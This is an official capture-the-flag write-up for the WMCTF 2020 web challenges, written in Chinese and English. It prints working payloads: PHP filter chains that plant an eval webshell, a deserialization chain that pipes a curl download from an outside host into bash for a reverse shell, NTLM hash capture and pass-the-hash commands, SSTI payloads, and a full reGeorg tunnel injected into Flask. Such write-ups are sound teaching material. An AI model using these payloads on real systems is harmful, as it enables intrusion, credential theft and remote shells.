## WMCTF 2020官方WriteUp 
# **Web：** 

## checkin1/2 

```plain
<?php 
//PHP 7.0.33 Apache/2.4.25 
error_reporting(0); 
$sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']); 
@mkdir($sandbox); 
@chdir($sandbox); 
highlight_file(__FILE__); 
if(isset($_GET['content'])) { 
    $content = $_GET['content']; 
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content)) 
         die('hacker'); 
    if(file_exists($content)) 
        require_once($content); 
    echo $content; 
    file_put_contents($content,'<?php exit();'.$content); 
} 
```
checkin由于题目配置出错，直接读/flag即可，所以才有了checkin2~ 
### 1.二次编码绕过 

file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了，可以简单构造一下参见的payload即可，可参考我之前写的文章中的一些简单的payload： [https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/) 

```plain
<?php 
$char = 'r'; #构造r的二次编码 
for ($ascii1 = 0; $ascii1 < 256; $ascii1++) { 
    for ($ascii2 = 0; $ascii2 < 256; $ascii2++) { 
        $aaa = '%'.$ascii1.'%'.$ascii2; 
        if(urldecode(urldecode($aaa)) == $char){ 
            echo $char.': '.$aaa; 
            echo "\n"; 
        } 
    } 
} 
?> 
php://filter/write=string.%7%32ot13|cuc cucvasb();|/resource=Cyc1e.php 
#Cyc1e.php 
<?cuc rkvg();cuc://svygre/jevgr=fgevat.%72bg13|<?php phpinfo();?>|/erfbhepr=Plp1r.cuc 
```
**注** ：payload放过滤器的位置或者放文件名位置都可（因为有些编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，然后跳过继续执行的）。 
### 2.过滤器绕过 

题目中过滤的过滤器有👇 

```plain
/iconv|UCS|UTF|rot|quoted|base64/ 
```
预留了zlib、bzip2、string等过滤器， `php:filter` 支持使用多个过滤器，所以可以利用 `zlib` 的 `zlib.deflate` 和 `zlib.inflate` 来做，压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间操作时候会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇 
```plain
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=Cyc1e.php 
```
当然，也是可以通过构造单个 `zlib.inflate` 解压字符，通过 `zlib.deflate` 压缩来构造shell，这里就不多说了。 
### 3.爆破临时文件 

环境特地设置了php 7.0.33版本，由于file_put_contents也可以利用伪协议，所以老问题，利用string.strip_tags会发生段错误，这时候上传一个shell会以临时文件的形式保存在/tmp中，利用require_once包含getshell即可（用一次就会被覆盖，所以直接反弹shell或者写马就行）。因为爆破的基数太大了，所以这个是一个最不好的解作为备选解，但是在比赛中，太多人同时爆破形成了DDOS，服务器也承受不住，所以我们选择封堵这条路（莫怪）。简单放下生成临时文件的脚本（网上就有）👇 

```plain
import requests 
import string 
import itertools 
​ 
charset = string.digits + string.letters 
​ 
host = "web_checkin2.wmctf.wetolink.com" 
port = 80 
base_url = "http://%s:%d" % (host, port) 
​ 
​ 
def upload_file_to_include(url, file_content): 
    files = {'file': ('evil.jpg', file_content, 'image/jpeg')} 
    try: 
        response = requests.post(url, files=files) 
    except Exception as e: 
        print e 
​ 
def generate_tmp_files(): 
    file_content = '<?php system("xxxxxxxx");?>' 
    phpinfo_url = "%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php" % ( 
        base_url) 
    print phpinfo_url 
    length = 6 
    times = len(charset) ** (length / 2) 
    for i in xrange(times): 
        print "[+] %d / %d" % (i, times) 
        upload_file_to_include(phpinfo_url, file_content) 
​ 
if __name__ == "__main__": 
    generate_tmp_files() 
```
## webweb 

```plain
<?php 
namespace CLI{ 
    class Agent 
    { 
        protected $server; 
        public function __construct($server) 
        { 
            $this->server=$server; 
        } 
    } 

    class WS 
    { 
    } 
} 
namespace DB{ 
    abstract class Cursor  implements \IteratorAggregate {} 
    class Mongo { 
        public $events; 
        public function __construct($events) 
        { 
            $this->events=$events; 
        } 
    } 
} 

namespace DB\Mongo{ 
    class Mapper extends \DB\Cursor { 
        protected $legacy=0; 
        protected $collection; 
        protected $document; 
        function offsetExists($offset){} 
        function offsetGet($offset){} 
        function offsetSet($offset, $value){} 
        function offsetUnset($offset){} 
        function getIterator(){}     
        public function __construct($collection,$document){ 
            $this->collection=$collection; 
            $this->document=$document; 
        } 
    } 
} 
namespace DB\SQL{ 
    class Mapper extends \DB\Cursor{ 
        protected $props=["insertone"=>"system"]; 
        function offsetExists($offset){} 
        function offsetGet($offset){} 
        function offsetSet($offset, $value){} 
        function offsetUnset($offset){} 
        function getIterator(){}    
    } 
} 

namespace{ 
$SQLMapper=new DB\SQL\Mapper(); 
$MongoMapper=new DB\Mongo\Mapper($SQLMapper,"curl https://shell.now.sh/39.106.207.66:2333 |bash"); 
$DBMongo=new DB\Mongo(array('disconnect'=>array($MongoMapper,"insert"))); 
$Agent=new CLI\Agent($DBMongo); 
$WS=new CLI\WS(); 
echo urlencode(serialize(array($WS,$Agent))); 
} 
```
## SimpleAuth 

打开题目，首先提示输入url参数 

![图片](https://uploader.shimo.im/f/CNDeCF1ypmKHb60J.png!thumbnail)

输入url参数后，提示只支持http协议。 

![图片](https://uploader.shimo.im/f/eINMM1a6INUF9d2A.png!thumbnail)

构造url请求自己vps的http端口，可以成功收到http请求。 

![图片](https://uploader.shimo.im/f/lXzSM8Qiintj6Zdb.png!thumbnail)

![图片](https://uploader.shimo.im/f/TJIQsfkBJ0rin5rj.png!thumbnail)

响应正常http时，页面显示nothing，接着可以尝试修改http响应包进行测试，比如返回401认证。 

```php
<?php 
    header('WWW-Authenticate: Basic realm="test"'); 
    header('HTTP/1.0 401 Unauthorized'); 
?> 
```
![图片](https://uploader.shimo.im/f/1isK9d7QmV0sU6pB.png!thumbnail)

当响应401认证时，页面的内容发现了变化，提示不支持该认证类型。通过查阅资料得知HTTP支持Basic、Digest、NTLM等认证类型，从网站信息中得知网站为Windows服务器。尝试响应NTLM类型的401认证。 

```php
<?php 
    header('WWW-Authenticate: NTLM'); 
    header('HTTP/1.0 401 Unauthorized'); 
?> 
```
重新请求发现响应内容发现了变化。 
![图片](https://uploader.shimo.im/f/yOfkBmZXK5ujhw4V.png!thumbnail)

通过tcpdump抓包可以看到，当http响应头要求NTLM认证时，题目会通过http NTLM认证再次请求url。 

![图片](https://uploader.shimo.im/f/VJtyP3UyglzqK6gi.png!thumbnail)

此时可以通过Responder工具模拟http认证，抓取Windows NTLM认证的Net-NTLM Hash。 

```plain
python Responder.py -I eth0 
```
再次请求，Responder接收到了Net-NTLM v1协议，包括了用户名及Net-NTLM v1 Hash。 
![图片](https://uploader.shimo.im/f/WHdOOYMAiQuLKIdQ.png!thumbnail)

从tcpdump流量可以分析出，NTLM协议开启了SSP，加密算法计算更为复杂导致破解难度加大。 

 为了拿到NTLM Hash，可以通过Responder -lm参数强制降级，关闭NTLM SSP。 

 但Responder的lm参数在实现上只支持了smb协议，需要修改packets.py脚本手动支持http协议。 

 Net-NTLM Hash破解文章： [https://daiker.gitbook.io/windows-protocol/ntlm-pian/6](https://daiker.gitbook.io/windows-protocol/ntlm-pian/6)

![图片](https://uploader.shimo.im/f/bgFcCMdliTuBn0z1.png!thumbnail)

再次请求，成功获取无SSP加密的Net-NTLM v1 Hash。 

![图片](https://uploader.shimo.im/f/1AawxyKLPMx69jKV.png!thumbnail)

由于NTLMv1算法的缺陷，可以通过哈希碰撞的方式将NetNTLMv1 Hash还原成NTLM Hash。 

NTLMv1算法计算中会生成一个随机Server Challenge并用在后续的哈希计算中，可以通过Responder工具指定Server Challenge从而更利于哈希碰撞。 

Responder默认Challenge为 `1122334455667788` 。 

国外网站 `crack.sh` 已经把Challenge为 `1122334455667788` 的所有彩虹表都跑出来了，直接通过网站解密即可拿到NTLM Hash。 

![图片](https://uploader.shimo.im/f/WGPkrHJ0JYKVuUhL.png!thumbnail)

提交解密后过一会就收到了解密成功的邮件，成功将Net-NTLM v1 Hash解密为NTLM Hash。 

![图片](https://uploader.shimo.im/f/WSail9ZnWi2SdKu4.png!thumbnail)

接下来是pass the hash利用，扫描题目ip的端口，发现开放SQL Server 1433端口，通过impacket的mssqlclient.py脚本进行pth连接，以sqluser用户身份连接数据库，即可拿到flag。 

```plain
python mssqlclient.py sqluser@119.3.141.162 -hashes :02f1caa8172bb4b0d758ecc38468a53a -windows-auth 
```
![图片](https://uploader.shimo.im/f/Ova99FiwnIJJVgNv.png!thumbnail)

## login_me_again_and_again 

访问题目，登录时提示错误。 

Access the chall, when login there will be error. 

![图片](https://uploader.shimo.im/f/H2O2MZBFaXHk5H7J.png!thumbnail)

查看源代码，发现源代码是一个使用flask和requests实现的反向代理程序，并且methods处将 `POST` 写成了 `P0ST` ，是无法从这个反向代理进行POST请求的。 

Read the source code, it is a proxy app made with python flask and requests, the methods atrribute in route `proxy` have `P0ST` instead of `POST` , so POST cannot be made with this proxy. 

![图片](https://uploader.shimo.im/f/djRqlcFwtHINbcHZ.png!thumbnail)

根据源代码中的注释 `用户->nginx->这个代理->nginx->真实的后端，只和一个nginx服务器` ，将host改成 `nginx` ，即可绕过代理直接访问后端。 

According to the comment `user->nginx->this proxy->nginx->real backend with only one nginx server` , modify the host to `nginx` to acccess the real backend directly and bypass the proxy. 

![图片](https://uploader.shimo.im/f/SUBGW2HIho0mWIM8.png!thumbnail)

尝试提交 `{{3*2}}` ，根据报错提示查看源码，针对username和password分别进行过滤，{{和}}不能同时出现，但是可以在username中出现{{，password中出现}}，构成模板注入。qu 

Try to submit `{{3*2}}` , read the source code from hint, the code does WAF for username and password separately, {{ and }} cannot appear at the same time. but there can be {{ in username and }} in password ,which makes SSTI. 

(非预期：全用{%和%}） 

(Unexpected bypass: use only {% and %}, I don't know it is possible:( ) 

![图片](https://uploader.shimo.im/f/1sApzO5uM0F2IpZv.png!thumbnail)

使用这个payload来读取并回显 `/flag` 的内容。 

Use this payload to read and show the contents of `/flag` . 

```plain
username={{url_for.__globals__['__builtins__']['eval']("open('/flag').read()#&password=")}} 
```
![图片](https://uploader.shimo.im/f/CVGyDpcwLrD3er5w.png!thumbnail)

知道flag不在本机，并且机器不能访问互联网，尝试使用requests库访问php主机。 

Shows that flag is not on this machine, and the machines cannot access the internet, use requests to access machine php. 

```plain
username={{url_for.__globals__['__builtins__']['eval'](request.form['a']%2b"#&password=")}}&a=__import__("base64").b64encode(__import__("requests").get("http://php/?source").text.encode()) 
```
在 `php` 登录，需要 `mysql` 主机上mysql里的密码（用户名固定为admin）。 
To login `php` , requires the password in mysql on machine `mysql` . 

![图片](https://uploader.shimo.im/f/XTlKWkV1P7XSQPMQ.png!thumbnail)

mysql需要登录和SSL，不能重放。 

mysql requires login and SSL, it is not possible to obtain password by simply replaying package. 

考虑使用打洞工具访问mysql，但是只有一个可控的python flask，考虑reGeorg，将reGeorg的马在flask里实现一遍。 

Use tunnel tool to access mysql, but only python flask is controllable, use reGeorg and implement reGeorg tunnel in flask. 

reGeorg: [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

```python
#coding:utf8 
​ 
if 'test' is '':  #test 
    from flask import Flask 
    app = Flask(__name__) 
else: 
    from flask import current_app as app 
#put these variables somewhere safe and reachable. 
import sys 
sys.tunnels = {} 
sys.currentTunnelId = 0 
​ 
​ 
@app.route("/proxy",methods=['GET','POST']) 
def tunnel(): 
    #this function has to be self contained, or you will see errors like request is not defined. 
    from flask import request as request,make_response as make_response,session as session 
    import socket 
    import errno 
    import sys 
    import traceback 
    tunnels = sys.tunnels 
    currentTunnelId = sys.currentTunnelId 
    def myMakeResponse(text,headers): 
        resp = make_response(text) 
        for i in headers: 
            resp.headers[i] = headers[i] 
        return resp 
    if(request.method == "GET"): 
        return "Georg says, 'All seems fine'" 
    if(request.method != "POST"): 
        return "?" 
    respHeaders = {} 
    respHeaders['X-STATUS'] = 'OK' 
    headers = request.headers 
    cmd = headers.get("X-CMD") 
    tid = int(request.cookies.get("tunnelid",-1)) 
    if(cmd == "CONNECT"): 
        target = headers["X-TARGET"] 
        port = int(headers["X-PORT"]) 
        try: 
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        except Exception as e: 
            respHeaders['X-STATUS'] = 'FAIL' 
            respHeaders['X-ERROR'] = 'Failed creating socket(is this possible for python?)' 
            return myMakeResponse('',respHeaders) 
        try: 
            sock.connect((target,port)); 
        except Exception as e: 
            respHeaders['X-STATUS'] = 'FAIL' 
            respHeaders['X-ERROR'] = 'Failed connecting to target' 
            return myMakeResponse('',respHeaders) 
        sock.setblocking(0) 
        tunnels[currentTunnelId] = sock 
        respHeaders['X-STATUS'] = 'OK' 
        resp = myMakeResponse('',respHeaders) 
        resp.set_cookie("tunnelid",str(currentTunnelId)) 
        sys.currentTunnelId+=1; 
        return resp;     
    elif(cmd == "DISCONNECT"): 
        try: 
            tunnels[tid].close(); 
            del tunnels[tid]; 
        except: 
            pass 
        resp = myMakeResponse('',respHeaders) 
        resp.set_cookie("tunnelid","-1") 
        return resp; 
    elif(cmd == "READ"): 
        sock = tunnels[tid]; 
        try: 
            buf = b"" 
            try: 
                t = sock.recv(1024) 
            except socket.error as e: 
                err = e.args[0] 
                if err == errno.EAGAIN or err == errno.EWOULDBLOCK: 
                    return myMakeResponse('',respHeaders) 
                raise 
            while t: 
                buf += t 
                try: 
                    t = sock.recv(1024) 
                except socket.error as e: 
                    err = e.args[0] 
                    if err == errno.EAGAIN or err == errno.EWOULDBLOCK: 
                        break 
                    raise 
            resp = myMakeResponse(buf,respHeaders) 
            return resp; 
        except Exception as e: 
            respHeaders['X-STATUS'] = 'FAIL' 
            respHeaders['X-ERROR'] = str(e) 
            return myMakeResponse('',respHeaders) 
    elif(cmd == "FORWARD"): 
        sock = tunnels[tid]; 
        try: 
            readlen = int(request.headers["Content-Length"]) 
            buff = request.stream.read(readlen) 
            sock.send(buff) 
            respHeaders['X-STATUS'] = 'OK' 
            return myMakeResponse('',respHeaders) 
        except Exception as e: 
            respHeaders['X-STATUS'] = 'FAIL' 
            respHeaders['X-ERROR'] = str(e) 
            return myMakeResponse('',respHeaders) 
         
```
编码并且使用ssti的方式注入进去，会添加/proxy 路由。 
Encode with urlencode and inject via ssti, will add a route of /proxy, can be accessed with reGeorg. 

```plain
注意，用exec而不是eval。 
note that it is needed to use exec instead of eval. 
```
![图片](https://uploader.shimo.im/f/1W9RxR05EnUHMyDV.png!thumbnail)

返回结果有 `Username: None` 表示代码成功执行，没有报错。 

Have the result of `Username: None` means the code executed without problem. 

reGeorg服务端也需要被修改，需要自己添加Host头，并且将227行处的 `conn.urlopen` 改成被注释的 `conn.request` （导致无法修改Host头）。 

The reGeorg server needs to be modified as well, add `"Host":"nginx",` in every `headers={}` ，and modify `conn.urlopen` on line 227 to the commented out `conn.request` (causes issue in modifing Host header). 

```python
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
​ 
import logging 
import argparse 
import urllib3 
from threading import Thread 
from urlparse import urlparse 
from socket import * 
from threading import Thread 
from time import sleep 
​ 
# Constants 
SOCKTIMEOUT = 5 
RESENDTIMEOUT = 300 
VER = "\x05" 
METHOD = "\x00" 
SUCCESS = "\x00" 
SOCKFAIL = "\x01" 
NETWORKFAIL = "\x02" 
HOSTFAIL = "\x04" 
REFUSED = "\x05" 
TTLEXPIRED = "\x06" 
UNSUPPORTCMD = "\x07" 
ADDRTYPEUNSPPORT = "\x08" 
UNASSIGNED = "\x09" 
​ 
BASICCHECKSTRING = "Georg says, 'All seems fine'" 
​ 
# Globals 
READBUFSIZE = 1024 
​ 
# Logging 
RESET_SEQ = "\033[0m" 
COLOR_SEQ = "\033[1;%dm" 
BOLD_SEQ = "\033[1m" 
​ 
BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8) 
​ 
LEVEL = {"INFO": logging.INFO, "DEBUG": logging.DEBUG, } 
​ 
logLevel = "INFO" 
​ 
COLORS = { 
    'WARNING': YELLOW, 
    'INFO': WHITE, 
    'DEBUG': BLUE, 
    'CRITICAL': YELLOW, 
    'ERROR': RED, 
    'RED': RED, 
    'GREEN': GREEN, 
    'YELLOW': YELLOW, 
    'BLUE': BLUE, 
    'MAGENTA': MAGENTA, 
    'CYAN': CYAN, 
    'WHITE': WHITE, 
} 
​ 
​ 
def formatter_message(message, use_color=True): 
    if use_color: 
        message = message.replace("$RESET", RESET_SEQ).replace("$BOLD", BOLD_SEQ) 
    else: 
        message = message.replace("$RESET", "").replace("$BOLD", "") 
    return message 
​ 
​ 
class ColoredFormatter(logging.Formatter): 
    def __init__(self, msg, use_color=True): 
        logging.Formatter.__init__(self, msg) 
        self.use_color = use_color 
​ 
    def format(self, record): 
        levelname = record.levelname 
        if self.use_color and levelname in COLORS: 
            levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ 
            record.levelname = levelname_color 
        return logging.Formatter.format(self, record) 
​ 
​ 
class ColoredLogger(logging.Logger): 
​ 
    def __init__(self, name): 
        FORMAT = "[$BOLD%(levelname)-18s$RESET]  %(message)s" 
        COLOR_FORMAT = formatter_message(FORMAT, True) 
        logging.Logger.__init__(self, name, logLevel) 
        if (name == "transfer"): 
            COLOR_FORMAT = "\x1b[80D\x1b[1A\x1b[K%s" % COLOR_FORMAT 
        color_formatter = ColoredFormatter(COLOR_FORMAT) 
​ 
        console = logging.StreamHandler() 
        console.setFormatter(color_formatter) 
​ 
        self.addHandler(console) 
        return 
​ 
​ 
logging.setLoggerClass(ColoredLogger) 
log = logging.getLogger(__name__) 
transferLog = logging.getLogger("transfer") 
​ 
​ 
class SocksCmdNotImplemented(Exception): 
    pass 
​ 
​ 
class SocksProtocolNotImplemented(Exception): 
    pass 
​ 
​ 
class RemoteConnectionFailed(Exception): 
    pass 
​ 
​ 
class session(Thread): 
    def __init__(self, pSocket, connectString): 
        Thread.__init__(self) 
        self.pSocket = pSocket 
        self.connectString = connectString 
        o = urlparse(connectString) 
        try: 
            self.httpPort = o.port 
        except: 
            if o.scheme == "https": 
                self.httpPort = 443 
            else: 
                self.httpPort = 80 
        self.httpScheme = o.scheme 
        self.httpHost = o.netloc.split(":")[0] 
        self.httpPath = o.path 
        self.cookie = None 
        if o.scheme == "http": 
            self.httpScheme = urllib3.HTTPConnectionPool 
        else: 
            self.httpScheme = urllib3.HTTPSConnectionPool 
​ 
    def parseSocks5(self, sock): 
        log.debug("SocksVersion5 detected") 
        nmethods, methods = (sock.recv(1), sock.recv(1)) 
        sock.sendall(VER + METHOD) 
        ver = sock.recv(1) 
        if ver == "\x02":  # this is a hack for proxychains 
            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1)) 
        else: 
            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1)) 
        target = None 
        targetPort = None 
        if atyp == "\x01":  # IPv4 
            # Reading 6 bytes for the IP and Port 
            target = sock.recv(4) 
            targetPort = sock.recv(2) 
            target = "." .join([str(ord(i)) for i in target]) 
        elif atyp == "\x03":  # Hostname 
            targetLen = ord(sock.recv(1))  # hostname length (1 byte) 
            target = sock.recv(targetLen) 
            targetPort = sock.recv(2) 
            target = "".join([unichr(ord(i)) for i in target]) 
        elif atyp == "\x04":  # IPv6 
            target = sock.recv(16) 
            targetPort = sock.recv(2) 
            tmp_addr = [] 
            for i in xrange(len(target) / 2): 
                tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1]))) 
            target = ":".join(tmp_addr) 
        targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1]) 
        if cmd == "\x02":  # BIND 
            raise SocksCmdNotImplemented("Socks5 - BIND not implemented") 
        elif cmd == "\x03":  # UDP 
            raise SocksCmdNotImplemented("Socks5 - UDP not implemented") 
        elif cmd == "\x01":  # CONNECT 
            serverIp = target 
            try: 
                serverIp = gethostbyname(target) 
            except: 
                log.error("oeps") 
            serverIp = "".join([chr(int(i)) for i in serverIp.split(".")]) 
            self.cookie = self.setupRemoteSession(target, targetPort) 
            if self.cookie: 
                sock.sendall(VER + SUCCESS + "\x00" + "\x01" + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) 
                return True 
            else: 
                sock.sendall(VER + REFUSED + "\x00" + "\x01" + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) 
                raise RemoteConnectionFailed("[%s:%d] Remote failed" % (target, targetPort)) 
​ 
        raise SocksCmdNotImplemented("Socks5 - Unknown CMD") 
​ 
    def parseSocks4(self, sock): 
        log.debug("SocksVersion4 detected") 
        cmd = sock.recv(1) 
        if cmd == "\x01":  # Connect 
            targetPort = sock.recv(2) 
            targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1]) 
            target = sock.recv(4) 
            sock.recv(1) 
            target = ".".join([str(ord(i)) for i in target]) 
            serverIp = target 
            try: 
                serverIp = gethostbyname(target) 
            except: 
                log.error("oeps") 
            serverIp = "".join([chr(int(i)) for i in serverIp.split(".")]) 
            self.cookie = self.setupRemoteSession(target, targetPort) 
            if self.cookie: 
                sock.sendall(chr(0) + chr(90) + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) 
                return True 
            else: 
                sock.sendall("\x00" + "\x91" + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) 
                raise RemoteConnectionFailed("Remote connection failed") 
        else: 
            raise SocksProtocolNotImplemented("Socks4 - Command [%d] Not implemented" % ord(cmd)) 
​ 
    def handleSocks(self, sock): 
        # This is where we setup the socks connection 
        ver = sock.recv(1) 
        if ver == "\x05": 
            return self.parseSocks5(sock) 
        elif ver == "\x04": 
            return self.parseSocks4(sock) 
​ 
    def setupRemoteSession(self, target, port): 
        headers = {"Host":"nginx","X-CMD": "CONNECT", "X-TARGET": target, "X-PORT": port} 
        self.target = target 
        self.port = port 
        cookie = None 
        conn = self.httpScheme(host=self.httpHost, port=self.httpPort) 
        response = conn.request("POST", self.httpPath, '', headers) 
        #response = conn.urlopen('POST', self.connectString + "?cmd=connect&target=%s&port=%d" % (target, port), headers=headers, body="") 
         
         
        if response.status == 200: 
            status = response.getheader("x-status") 
            if status == "OK": 
                cookie = response.getheader("set-cookie") 
                log.info("[%s:%d] HTTP [200]: cookie [%s]" % (self.target, self.port, cookie)) 
            else: 
                if response.getheader("X-ERROR") is not None: 
                    log.error(response.getheader("X-ERROR")) 
        else: 
            log.error("[%s:%d] HTTP [%d]: [%s]" % (self.target, self.port, response.status, response.getheader("X-ERROR"))) 
            log.error("[%s:%d] RemoteError: %s" % (self.target, self.port, response.data)) 
        conn.close() 
        return cookie 
​ 
    def closeRemoteSession(self): 
        headers = {"Host":"nginx","X-CMD": "DISCONNECT", "Cookie": self.cookie} 
        params = "" 
        conn = self.httpScheme(host=self.httpHost, port=self.httpPort) 
        response = conn.request("POST", self.httpPath + "?cmd=disconnect", params, headers) 
        if response.status == 200: 
            log.info("[%s:%d] Connection Terminated" % (self.target, self.port)) 
        conn.close() 
​ 
    def reader(self): 
        conn = urllib3.PoolManager() 
        while True: 
            try: 
                if not self.pSocket: 
                    break 
                data = "" 
                headers = {"Host":"nginx","X-CMD": "READ", "Cookie": self.cookie, "Connection": "Keep-Alive"} 
                response = conn.urlopen('POST', self.connectString + "?cmd=read", headers=headers, body="") 
                data = None 
                if response.status == 200: 
                    status = response.getheader("x-status") 
                    if status == "OK": 
                        if response.getheader("set-cookie") is not None: 
                            cookie = response.getheader("set-cookie") 
                        data = response.data 
                        # Yes I know this is horrible, but its a quick fix to issues with tomcat 5.x bugs that have been reported, will find a propper fix laters 
                        try: 
                            if response.getheader("server").find("Apache-Coyote/1.1") > 0: 
                                data = data[:len(data) - 1] 
                        except: 
                            pass 
                        if data is None: 
                            data = "" 
                    else: 
                        data = None 
                        log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (self.target, self.port, response.status, status, response.getheader("X-ERROR"))) 
                else: 
                    log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status)) 
                if data is None: 
                    # Remote socket closed 
                    break 
                if len(data) == 0: 
                    sleep(0.1) 
                    continue 
                transferLog.info("[%s:%d] <<<< [%d]" % (self.target, self.port, len(data))) 
                self.pSocket.send(data) 
            except Exception, ex: 
                raise ex 
        self.closeRemoteSession() 
        log.debug("[%s:%d] Closing localsocket" % (self.target, self.port)) 
        try: 
            self.pSocket.close() 
        except: 
            log.debug("[%s:%d] Localsocket already closed" % (self.target, self.port)) 
​ 
    def writer(self): 
        global READBUFSIZE 
        conn = urllib3.PoolManager() 
        while True: 
            try: 
                self.pSocket.settimeout(1) 
                data = self.pSocket.recv(READBUFSIZE) 
                if not data: 
                    break 
                headers = {"Host":"nginx","X-CMD": "FORWARD", "Cookie": self.cookie, "Content-Type": "application/octet-stream", "Connection": "Keep-Alive"} 
                response = conn.urlopen('POST', self.connectString + "?cmd=forward", headers=headers, body=data) 
                if response.status == 200: 
                    status = response.getheader("x-status") 
                    if status == "OK": 
                        if response.getheader("set-cookie") is not None: 
                            self.cookie = response.getheader("set-cookie") 
                    else: 
                        log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (self.target, self.port, response.status, status, response.getheader("x-error"))) 
                        break 
                else: 
                    log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status)) 
                    break 
                transferLog.info("[%s:%d] >>>> [%d]" % (self.target, self.port, len(data))) 
            except timeout: 
                continue 
            except Exception, ex: 
                raise ex 
                break 
        self.closeRemoteSession() 
        log.debug("Closing localsocket") 
        try: 
            self.pSocket.close() 
        except: 
            log.debug("Localsocket already closed") 
​ 
    def run(self): 
        try: 
            if self.handleSocks(self.pSocket): 
                log.debug("Staring reader") 
                r = Thread(target=self.reader, args=()) 
                r.start() 
                log.debug("Staring writer") 
                w = Thread(target=self.writer, args=()) 
                w.start() 
                r.join() 
                w.join() 
        except SocksCmdNotImplemented, si: 
            log.error(si.message) 
            self.pSocket.close() 
        except SocksProtocolNotImplemented, spi: 
            log.error(spi.message) 
            self.pSocket.close() 
        except Exception, e: 
            log.error(e.message) 
            self.closeRemoteSession() 
            self.pSocket.close() 
​ 
​ 
def askGeorg(connectString): 
    connectString = connectString 
    o = urlparse(connectString) 
    try: 
        httpPort = o.port 
    except: 
        if o.scheme == "https": 
            httpPort = 443 
        else: 
            httpPort = 80 
    httpScheme = o.scheme 
    httpHost = o.netloc.split(":")[0] 
    httpPath = o.path 
    if o.scheme == "http": 
        httpScheme = urllib3.HTTPConnectionPool 
    else: 
        httpScheme = urllib3.HTTPSConnectionPool 
​ 
    conn = httpScheme(host=httpHost, port=httpPort) 
    response = conn.request("GET", httpPath) 
    if response.status == 200: 
        if BASICCHECKSTRING == response.data.strip(): 
            log.info(BASICCHECKSTRING) 
            return True 
    conn.close() 
    return False 
​ 
if __name__ == '__main__': 
    print """\033[1m 
    \033[1;33m 
                     _____ 
  _____   ______  __|___  |__  ______  _____  _____   ______ 
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______| 
                    |_____| 
                    ... every office needs a tool like Georg 
​ 
  willem@sensepost.com / @_w_m__ 
  sam@sensepost.com / @trowalts 
  etienne@sensepost.com / @kamp_staaldraad 
  \033[0m 
   """ 
    log.setLevel(logging.DEBUG) 
    parser = argparse.ArgumentParser(description='Socks server for reGeorg HTTP(s) tunneller') 
    parser.add_argument("-l", "--listen-on", metavar="", help="The default listening address", default="127.0.0.1") 
    parser.add_argument("-p", "--listen-port", metavar="", help="The default listening port", type=int, default="8888") 
    parser.add_argument("-r", "--read-buff", metavar="", help="Local read buffer, max data to be sent per POST", type=int, default="1024") 
    parser.add_argument("-u", "--url", metavar="", required=True, help="The url containing the tunnel script") 
    parser.add_argument("-v", "--verbose", metavar="", help="Verbose output[INFO|DEBUG]", default="INFO") 
    args = parser.parse_args() 
    if (args.verbose in LEVEL): 
        log.setLevel(LEVEL[args.verbose]) 
        log.info("Log Level set to [%s]" % args.verbose) 
​ 
    log.info("Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url)) 
    log.info("Checking if Georg is ready") 
    if not askGeorg(args.url): 
        log.info("Georg is not ready, please check url") 
        exit() 
    READBUFSIZE = args.read_buff 
    servSock = socket(AF_INET, SOCK_STREAM) 
    servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) 
    servSock.bind((args.listen_on, args.listen_port)) 
    servSock.listen(1000) 
    while True: 
        try: 
            sock, addr_info = servSock.accept() 
            sock.settimeout(SOCKTIMEOUT) 
            log.debug("Incomming connection") 
            session(sock, args.url).start() 
        except KeyboardInterrupt, ex: 
            break 
        except Exception, e: 
            log.error(e) 
    servSock.close() 
​ 
```
使用reGeorg，获取密码（要传递 `--ssl=1` 给mysql）。 
Use reGeorg and get the password (pass `--ssl=1` to mysql). 

![图片](https://uploader.shimo.im/f/wqqJgUGoudRC00em.png!thumbnail)

(This screenshot is taken later with another docker so the ip changed.) 

![图片](https://uploader.shimo.im/f/RB8SgNqpo0tchmjD.png!thumbnail)

提交密码得到flag。 

Submit the password and get flag. 

### ![图片](https://uploader.shimo.im/f/uX6OZGqzEXloR7Pv.png!thumbnail)

